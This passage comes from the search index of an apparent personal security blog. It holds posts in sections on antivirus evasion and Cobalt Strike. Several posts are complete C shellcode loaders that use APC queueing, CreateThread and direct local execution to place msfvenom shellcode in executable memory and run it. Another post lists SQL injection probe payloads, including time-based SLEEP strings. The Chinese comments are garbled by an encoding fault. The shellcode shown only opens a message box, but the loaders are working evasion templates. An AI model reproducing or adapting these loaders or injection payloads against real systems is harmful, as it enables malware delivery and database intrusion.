\u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; // ç”³è¯·å†…å­˜ (RWX) void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); // å¤åˆ¶shellcdoe RtlMoveMemory(exec, buf, sizeof(buf)); // æ’å…¥ APC é˜Ÿåˆ— // å‚æ•°1: APC å‡½æ•°åœ°å€ (Shellcode) // å‚æ•°2: ç›®æ ‡çº¿ç¨‹å¥æŸ„ (å½“å‰çº¿ç¨‹) // å‚æ•°3: ä¼ ç»™å‡½æ•°çš„å‚æ•° QueueUserAPC((PAPCFUNC)exec, GetCurrentThread(), NULL); // è§¦å‘æ‰§è¡Œ (Alertable State) // çº¿ç¨‹å¿…é¡»è¿›å…¥\u0026#34;å¯è­¦å‘ŠçŠ¶æ€\u0026#34;ï¼ŒAPC æ‰ä¼šæ‰§è¡Œã€‚ // SleepEx çš„ç¬¬äºŒä¸ªå‚æ•° TRUE è¡¨ç¤ºå…è®¸è¢« APC æ‰“æ–­ã€‚ SleepEx(1000, TRUE); return 0; } "},{"id":8,"href":"/posts/2026/01/Cobaltstrike%E4%BA%8C%E5%BC%80/","title":"CobaltstrikeäºŒå¼€","section":"CobaltStrike","content":""},{"id":9,"href":"/posts/2026/01/CreateThreadInjection/","title":"CreateThreadInjection","section":"å…æ€\u0026Tip","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include \u0026lt;windows.h\u0026gt; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char buf[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; // 1. ç”³è¯·å†…å­˜ (RWX) void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 2. å¤åˆ¶æ•°æ® RtlMoveMemory(exec, buf, sizeof(buf)); // 3. åˆ›å»ºçº¿ç¨‹æ‰§è¡Œ HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0); // 4. ç­‰å¾…æ‰§è¡Œç»“æŸ WaitForSingleObject(th, -1); return 0; } "},{"id":10,"href":"/posts/2026/01/MySQL-injection/","title":"MySQL injection","section":"MySQL æ³¨å…¥","content":" æ£€æµ‹payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026#39; \u0026#34; ` %df\u0026#39; %27 %2527 ) )) \u0026#39;) \u0026#34;) ; -- /* # 1+1 1-0 1/0 1e308 %0a %09 -- AND 1=1 AND 1=2 \u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;2 \u0026#34; AND \u0026#34;1\u0026#34;=\u0026#34;1 \u0026#34; AND \u0026#34;1\u0026#34;=\u0026#34;2 \u0026#39;) AND (\u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; AND SLEEP(5)--+ \u0026#34; AND SLEEP(5)--+ AND (SELECT * FROM (SELECT(SLEEP(5)))a) "},{"id":11,"href":"/posts/2026/01/LocalProcessInjection/","title":"LocalProcessInjection","section":"å…æ€\u0026Tip","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026#34;Windows.h\u0026#34; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; } "},{"id":12,"href":"/posts/2026/01/My-First-Post/","title":"My First Post","section":"Posts","content":"Introduction# This is bold text, and this is emphasized text.\nVisit the Hugo website!\n"},{"id":13,"href":"/about/","title":"å…³äºæˆ‘","section":"Fivesix's blog","content":"ğŸ‘‹ ä½ å¥½ï¼# ğŸˆšï¸\n"}]